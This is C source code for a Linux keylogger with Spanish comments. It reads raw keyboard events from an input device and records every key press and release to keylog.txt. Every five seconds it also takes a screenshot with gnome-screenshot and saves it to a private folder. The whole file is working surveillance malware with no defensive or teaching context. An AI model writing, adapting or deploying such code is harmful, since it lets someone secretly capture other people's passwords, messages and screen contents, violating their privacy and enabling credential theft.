#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>

#define DEVICE "/dev/input/event4"  // Cambia esto al archivo de dispositivo adecuado
#define SCREENSHOT_DIR "screenshots"  // Carpeta para guardar las capturas de pantalla
#define SCREENSHOT_INTERVAL 5  // Intervalo en segundos para capturar la pantalla

void create_screenshot_dir() {
    struct stat st = {0};
    if (stat(SCREENSHOT_DIR, &st) == -1) {
        mkdir(SCREENSHOT_DIR, 0700);
    }
}

void get_timestamp(char *buffer, size_t buffer_size) {
    time_t rawtime;
    struct tm *timeinfo;
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    strftime(buffer, buffer_size, "%Y-%m-%d_%H-%M-%S", timeinfo);
}

void take_screenshot() {
    char timestamp[80];
    get_timestamp(timestamp, sizeof(timestamp));
    
    char file_name[120];
    snprintf(file_name, sizeof(file_name), "%s/screenshot_%s.png", SCREENSHOT_DIR, timestamp);
    
    // Usa gnome-screenshot para tomar la captura de pantalla
    char command[150];
    snprintf(command, sizeof(command), "gnome-screenshot -f '%s'", file_name);
    
    int result = system(command);
    if (result != 0) {
        fprintf(stderr, "Error taking screenshot with command: %s\n", command);
    }
}

void log_key(const char *file_name, const char *key_info) {
    FILE *file = fopen(file_name, "a");
    if (file == NULL) {
        perror("fopen");
        exit(EXIT_FAILURE);
    }
    fprintf(file, "%s\n", key_info);
    fclose(file);
}

const char* get_key_name(int keycode, int value) {
    switch (keycode) {
        case KEY_A: return value == 1 ? "KEY_A (down)" : "KEY_A (up)";
        case KEY_B: return value == 1 ? "KEY_B (down)" : "KEY_B (up)";
        case KEY_C: return value == 1 ? "KEY_C (down)" : "KEY_C (up)";
        case KEY_D: return value == 1 ? "KEY_D (down)" : "KEY_D (up)";
        case KEY_E: return value == 1 ? "KEY_E (down)" : "KEY_E (up)";
        case KEY_F: return value == 1 ? "KEY_F (down)" : "KEY_F (up)";
        case KEY_G: return value == 1 ? "KEY_G (down)" : "KEY_G (up)";
        case KEY_H: return value == 1 ? "KEY_H (down)" : "KEY_H (up)";
        case KEY_I: return value == 1 ? "KEY_I (down)" : "KEY_I (up)";
        case KEY_J: return value == 1 ? "KEY_J (down)" : "KEY_J (up)";
        case KEY_K: return value == 1 ? "KEY_K (down)" : "KEY_K (up)";
        case KEY_L: return value == 1 ? "KEY_L (down)" : "KEY_L (up)";
        case KEY_M: return value == 1 ? "KEY_M (down)" : "KEY_M (up)";
        case KEY_N: return value == 1 ? "KEY_N (down)" : "KEY_N (up)";
        case KEY_O: return value == 1 ? "KEY_O (down)" : "KEY_O (up)";
        case KEY_P: return value == 1 ? "KEY_P (down)" : "KEY_P (up)";
        case KEY_Q: return value == 1 ? "KEY_Q (down)" : "KEY_Q (up)";
        case KEY_R: return value == 1 ? "KEY_R (down)" : "KEY_R (up)";
        case KEY_S: return value == 1 ? "KEY_S (down)" : "KEY_S (up)";
        case KEY_T: return value == 1 ? "KEY_T (down)" : "KEY_T (up)";
        case KEY_U: return value == 1 ? "KEY_U (down)" : "KEY_U (up)";
        case KEY_V: return value == 1 ? "KEY_V (down)" : "KEY_V (up)";
        case KEY_W: return value == 1 ? "KEY_W (down)" : "KEY_W (up)";
        case KEY_X: return value == 1 ? "KEY_X (down)" : "KEY_X (up)";
        case KEY_Y: return value == 1 ? "KEY_Y (down)" : "KEY_Y (up)";
        case KEY_Z: return value == 1 ? "KEY_Z (down)" : "KEY_Z (up)";
        case KEY_1: return value == 1 ? "KEY_1 (down)" : "KEY_1 (up)";
        case KEY_2: return value == 1 ? "KEY_2 (down)" : "KEY_2 (up)";
        case KEY_3: return value == 1 ? "KEY_3 (down)" : "KEY_3 (up)";
        case KEY_4: return value == 1 ? "KEY_4 (down)" : "KEY_4 (up)";
        case KEY_5: return value == 1 ? "KEY_5 (down)" : "KEY_5 (up)";
        case KEY_6: return value == 1 ? "KEY_6 (down)" : "KEY_6 (up)";
        case KEY_7: return value == 1 ? "KEY_7 (down)" : "KEY_7 (up)";
        case KEY_8: return value == 1 ? "KEY_8 (down)" : "KEY_8 (up)";
        case KEY_9: return value == 1 ? "KEY_9 (down)" : "KEY_9 (up)";
        case KEY_0: return value == 1 ? "KEY_0 (down)" : "KEY_0 (up)";
        case KEY_LEFTMETA: return value == 1 ? "KEY_LEFTMETA (down)" : "KEY_LEFTMETA (up)";
        case KEY_RIGHTMETA: return value == 1 ? "KEY_RIGHTMETA (down)" : "KEY_RIGHTMETA (up)";
        case KEY_SPACE: return value == 1 ? "KEY_SPACE (down)" : "KEY_SPACE (up)";
        case KEY_ENTER: return value == 1 ? "KEY_ENTER (down)" : "KEY_ENTER (up)";
        case KEY_BACKSPACE: return value == 1 ? "KEY_BACKSPACE (down)" : "KEY_BACKSPACE (up)";
        case KEY_LEFTCTRL: return value == 1 ? "KEY_LEFTCTRL (down)" : "KEY_LEFTCTRL (up)";
        case KEY_RIGHTCTRL: return value == 1 ? "KEY_RIGHTCTRL (down)" : "KEY_RIGHTCTRL (up)";
        case KEY_LEFTALT: return value == 1 ? "KEY_LEFTALT (down)" : "KEY_LEFTALT (up)";
        case KEY_RIGHTALT: return value == 1 ? "KEY_RIGHTALT (down)" : "KEY_RIGHTALT (up)";
        case KEY_PRINT: return value == 1 ? "KEY_PRINT (down)" : "KEY_PRINT (up)";
        case KEY_DELETE: return value == 1 ? "KEY_DELETE (down)" : "KEY_DELETE (up)";
        default: return value == 1 ? "UNKNOWN (down)" : "UNKNOWN (up)";
    }
}

int main() {
    int fd;
    struct input_event ie;
    const char *log_file = "keylog.txt";

    create_screenshot_dir();

    fd = open(DEVICE, O_RDONLY);
    if (fd == -1) {
        perror("open");
        exit(EXIT_FAILURE);
    }

    time_t last_screenshot_time = time(NULL);

    while (1) {
        ssize_t bytes_read = read(fd, &ie, sizeof(struct input_event));
        if (bytes_read < 0) {
            perror("read");
            close(fd);
            exit(EXIT_FAILURE);
        }

        if (ie.type == EV_KEY) {
            char key_info[50];
            snprintf(key_info, sizeof(key_info), "%s", get_key_name(ie.code, ie.value));
            log_key(log_file, key_info);
        }

        // Captura la pantalla cada 5 segundos
        time_t current_time = time(NULL);
        if (difftime(current_time, last_screenshot_time) >= SCREENSHOT_INTERVAL) {
            take_screenshot();
            last_screenshot_time = current_time;
        }
    }

    close(fd);
    return 0;
}
